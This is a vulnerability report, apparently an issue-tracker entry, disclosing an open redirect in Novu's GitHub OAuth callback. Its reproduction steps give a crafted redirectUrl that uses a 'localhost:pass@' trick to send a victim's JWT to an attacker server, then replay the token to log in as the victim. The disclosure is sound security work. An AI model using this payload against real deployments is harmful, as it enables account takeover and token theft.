| [NV-2228 Open redirect vulnerability](https://linear.app/novu/issue/NV-2228/open-redirect-vulnerability)  Description An open redirect vulnerability exists in `/v1/auth/github/callback`.  An attacker can exploit the vulnerability by tricking a victim to click the malicious URL. A successful exploit allows the attacker to log into novu as the victim.  The vulnerable code: `[https://github.com/novuhq/novu/blob/5f94d65b1ab8d618aed9768a6e2877a1614e10d8/apps/api/src/app/auth/auth.controller.ts#L94-L96`](https://github.com/novuhq/novu/blob/5f94d65b1ab8d618aed9768a6e2877a1614e10d8/apps/api/src/app/auth/auth.controller.ts#L94-L96%60). Steps to reproduce Prerequisite: Enable Sign In with GitHub functionality.  0. [Attacker] Send the following URL to the victim: `[https://<novu\_api>/v1/auth/github?source=web&redirectUrl=http://localhost:pass<attacker\_server>/`](https://%3Cnovu_api%3E/v1/auth/github?source=web&redirectUrl=http://localhost:pass%3Cattacker_server%3E/%60) 1. [Victim] Open the URL in your web browser. 2. [Victim] Log into GitHub if not. 3. [Victim] You will be redirected to `[https://<novu\_api>/v1/auth/github/callback?code=`&state=%7B%22source%22%3A%22web%22%2C%22redirectUrl%22%3A%22http%3A%2F%2Flocalhost%3Apass%40<attacker_server>%2F%22%7D``](https://%3Cnovu_api%3E/v1/auth/github/callback?code=%3Ccode%3E&state=%7B%22source%22%3A%22web%22%2C%22redirectUrl%22%3A%22http%3A%2F%2Flocalhost%3Apass%40%3Cattacker_server%3E%2F%22%7D%60) `in turn `[http://localhost:pass<attacker_server>/?token=<JWT_token>`.](http://localhost:pass%3Cattacker_server%3E/?token=%3CJWT_token%3E%60.) 4. [Attacker] Get the `<JWT_token>` value sent by the victim on step 3 by inspecting the server's log. 5. [Attacker] Open the following URL in your web browser: `[https://<novu_web>/auth/login?token=<JWT_token>`](https://%3Cnovu_web%3E/auth/login?token=%3CJWT_token%3E%60) 6. [Attacker] Confirm you logged in as the victim.` |
